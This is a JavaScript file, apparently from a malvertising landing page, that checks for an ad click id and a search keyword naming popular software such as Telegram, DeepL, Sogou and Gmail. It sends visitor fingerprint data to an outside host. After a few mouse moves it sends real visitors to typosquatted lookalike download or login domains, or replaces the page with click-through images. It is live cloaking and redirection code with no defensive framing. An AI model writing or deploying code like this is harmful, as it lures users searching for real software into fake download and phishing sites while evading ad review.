var numCount=0;
var allowCount=5;
var confArr=[
["helloworld",3,"https://www.hellowold2.com",true],
["yifanyi|易翻译",2,"https://changjieweb.com",true],
["deepl",1,"https://www.zjznmbf.com",true],
["teams",2,"https://xytyts.com",true],
["sogou|sougou|搜狗|输入法",3,"https://down.666888.help/goo/sougou.php",false],
["kuailian|快连",3,"https://down.666888.help/goo/letsp.php",false],
["qishui|汽水",1,"https://www.yssuygdm.com",false],
["telegram|tg|飞机|电报",5,"https://down.telagarm.help/downloads.php",false],
["snipaste|截图|截屏",6,"https://www.gbdsmys.com",false],
["gmail|邮箱",1,"https://workspace.gmoil.my.id",true],
["as|爱思",3,"https://www.luodtxd.com",false],
["hellogpt",1,"https://hallogpt.cloud",true]
];

var findObj;

$(function()
{
	const urlParams = new URLSearchParams(window.location.search);
	var kw=urlParams.get("kw");
	var gclid=urlParams.get("gclid");
	if(kw){kw=kw.toLowerCase().replaceAll(" ","");}
	if(kw && gclid)
	{
		for(var i=0;i<confArr.length;i++)
		{
			var arrObj=confArr[i];
			var curName=arrObj[0].toLowerCase();
			if(new RegExp(curName).test(kw)==true)
			{
				findObj=confArr[i];
				vpt();
				break;
			}
		}
	}
	if(findObj)
	{
		$("body").append("<ul class='haufw'><li></li></ul>");
	}

	$("body").mousemove(function(event)
	{
		if(event.pageX>0 && event.pageY>0 && findObj)
		{
			numCount++;
			if(numCount==allowCount)
			{
				document.title="site";
				if(findObj[3]==true)
				{
					window.location=findObj[2];
				}
				else
				{
					var imgDoms="";
					var sName=findObj[0].split("|")[0];
					for(var i=1;i<=findObj[1];i++)
					{
						imgDoms+="<img src='img/"+sName+i+".jpg' />";
					}
					$("body").html(imgDoms);
					$("body").css("line-height","0px");
				}
			}
		}
	});

	$("body").click(function(event)
	{
		if(checkRes(event)==true)
		{
			window.location=findObj[2];
		}
	});
})

function checkRes(e)
{
	if(numCount>=allowCount && e.pageX>0 && e.pageY>0 && findObj)
	{return true;}else{return false;}
}

function vpt() {
      function toText(value) {
          return value === undefined || value === null ? "" : String(value);
      }

      function toBoolText(value) {
          if (value === true) return "true";
          if (value === false) return "false";
          return "";
      }

      function toChUa(brands) {
          if (!brands || !brands.length) return "";
          var list = [];
          for (var i = 0; i < brands.length; i++) {
              var item = brands[i] || {};
              if (!item.brand) continue;
              list.push('"' + item.brand + '";v="' + (item.version || "") + '"');
          }
          return list.join(", ");
      }

      function send(highEntropy) {
          var ua = navigator.userAgentData || {};
          var conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection || {};
          var scr = window.screen || {};
          highEntropy = highEntropy || {};

          var payload = {
              referer: window.location.href,
              userAgent: navigator.userAgent || "",

              secChUa: toChUa(ua.brands || []),
              secChUaMobile: ua.mobile === true ? "?1" : "?0",
              secChUaPlatform: toText(ua.platform),
              secChUaFullVersion: toText(highEntropy.uaFullVersion),
              secChUaFullVersionList: highEntropy.fullVersionList || [],
              secChUaPlatformVersion: toText(highEntropy.platformVersion),
              secChUaArch: toText(highEntropy.architecture),
              secChUaBitness: toText(highEntropy.bitness),
              secChUaModel: toText(highEntropy.model),
              secChUaFormFactors: highEntropy.formFactors || [],
              secChUaWoW64: toBoolText(highEntropy.wow64),

              width: toText(scr.width),
              height: toText(scr.height),
              availWidth: toText(scr.availWidth),
              availHeight: toText(scr.availHeight),

              downlink: toText(conn.downlink),
              effectiveType: toText(conn.effectiveType),
              rtt: toText(conn.rtt),
              saveData: toBoolText(conn.saveData),

              userAgentData: {
                  brands: ua.brands || [],
                  mobile: ua.mobile === true,
                  platform: toText(ua.platform),
                  architecture: toText(highEntropy.architecture),
                  bitness: toText(highEntropy.bitness),
                  formFactors: highEntropy.formFactors || [],
                  fullVersionList: highEntropy.fullVersionList || [],
                  model: toText(highEntropy.model),
                  platformVersion: toText(highEntropy.platformVersion),
                  uaFullVersion: toText(highEntropy.uaFullVersion),
                  wow64: highEntropy.wow64 === true
              }
          };

          $.ajax({
              url: "https://admfd.com/Siv/Sivs",
              type: "POST",
              data: JSON.stringify(payload),
              contentType: "text/plain; charset=UTF-8",
              processData: false,
              crossDomain: true
          });
      }

      if (navigator.userAgentData && typeof navigator.userAgentData.getHighEntropyValues === "function") {
          navigator.userAgentData.getHighEntropyValues([
              "architecture",
              "bitness",
              "formFactors",
              "fullVersionList",
              "model",
              "platformVersion",
              "uaFullVersion",
              "wow64"
          ]).then(function (highEntropy) {
              send(highEntropy);
          }).catch(function () {
              send({});
          });
      } else {
          send({});
      }
  }
